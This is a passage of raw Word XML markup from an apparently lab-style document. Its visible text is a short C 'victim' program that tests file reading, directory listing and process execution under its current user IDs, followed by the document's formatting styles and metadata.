          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    int fd, n;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4191958A" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pid_t pid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0922AE98" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1290C06F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    printf("[victim] starting: uid=%d euid=%d pid=%d\n", getuid(), geteuid(), getpid());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5633132D" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00738FAD" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    printf("\n[victim] --- file access test ---\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5B89A8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fd = open("/tmp/secret.txt", O_RDONLY);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBCD983" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (fd &lt; 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF12FC2" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        perror("[victim] open(\"/tmp/secret.txt\") FAILED");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C21605" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    } else {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D39110" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n = read(fd, buf, sizeof(buf) - 1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2770E516" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if (n &gt; 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31114167" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            buf[n] = '\0';</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E06E009" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            printf("[victim] read %d bytes: %s", n, buf);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CDAE61" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A7BBD8" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        close(fd);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDE29ED" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFB6ED9" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D83726" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    printf("\n[victim] --- directory listing test ---\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC88F1C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    system("ls -l /tmp/secret.txt 2&gt;&amp;1 || echo '[victim] secret.txt not visible to ls'");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65270AFF" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DDD325" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    printf("\n[victim] --- process execution test ---\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FA0B9B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pid = fork();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189C18FF" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (pid == 0) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3777A064" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        char *argv[] = { "/bin/uname", "-a", NULL };</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0350E72F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        execve("/bin/uname", argv, environ);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C1BB28" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        perror("[victim] execve failed");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1035D982" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        _exit(127);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE610E3" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2122CB4E" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    waitpid(pid, NULL, 0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDE261C" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    printf("[victim] child finished\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B68D18B" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3BA560" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00F66EC6" w:rsidSect="00034616">
      <w:footerReference w:type="default" r:id="rId24"/>
      <w:pgSz w:w="11906" w:h="16838"/>
      <w:pgMar w:top="1417" w:right="1134" w:bottom="1417" w:left="1134"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5E8483" w14:textId="77777777" w:rsidR="00F341CB" w:rsidRDefault="00F341CB">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="4BA9A906" w14:textId="77777777" w:rsidR="00F341CB" w:rsidRDefault="00F341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56B0A7" w14:textId="77777777" w:rsidR="00886FCA" w:rsidRDefault="00886FC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0F5CA" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText>PAGE</w:instrText>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r>
      <w:t>1</w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:instrText>NUMPAGES</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2298D6" w14:textId="77777777" w:rsidR="00F341CB" w:rsidRDefault="00F341CB">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="038C933C" w14:textId="77777777" w:rsidR="00F341CB" w:rsidRDefault="00F341C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36571363">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1868367582">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="161820991">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="745496675">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="790366817">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="294458473">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1096637628">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="157813011">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="14594940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7A27"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00324158"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003E3DD2"/>
    <w:rsid w:val="005311C6"/>
    <w:rsid w:val="005F5F09"/>
    <w:rsid w:val="0077071E"/>
    <w:rsid w:val="007E20E1"/>
    <w:rsid w:val="00886FCA"/>
    <w:rsid w:val="00896300"/>
    <w:rsid w:val="00925EF8"/>
    <w:rsid w:val="009C1980"/>
    <w:rsid w:val="009F23E6"/>
    <w:rsid w:val="009F2CDF"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AD31D7"/>
    <w:rsid w:val="00B41897"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BA6FB0"/>
    <w:rsid w:val="00BB54DC"/>
    <w:rsid w:val="00C36301"/>
    <w:rsid w:val="00C90E41"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CD4710"/>
    <w:rsid w:val="00D728AA"/>
    <w:rsid w:val="00D90EB8"/>
    <w:rsid w:val="00EA38C4"/>
    <w:rsid w:val="00F341CB"/>
    <w:rsid w:val="00F66EC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46407E"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{1676258B-EB76-4678-BA8A-1514C3E87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Custom">
    <w:name w:val="TitleCustom"/>
    <w:basedOn w:val="Normal"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:color w:val="1F4E79"/>
      <w:sz w:val="40"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="SubtitleCustom">
    <w:name w:val="SubtitleCustom"/>
    <w:basedOn w:val="Normal"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:i/>
      <w:color w:val="404040"/>
      <w:sz w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CaptionCustom">
    <w:name w:val="CaptionCustom"/>
    <w:basedOn w:val="Normal"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:i/>
      <w:color w:val="595959"/>
      <w:sz w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CodeCustom">
    <w:name w:val="CodeCustom"/>
    <w:basedOn w:val="Normal"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AD31D7"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AD31D7"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00AD31D7"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0032415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jpe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hyperlink" Target="https://man7.org/linux/man-pages/" TargetMode="Externa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15</Pages>
  <Words>3095</Words>
  <Characters>17648</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20702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Farook Faraj</cp:lastModifiedBy>
  <cp:revision>7</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-29T13:49:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>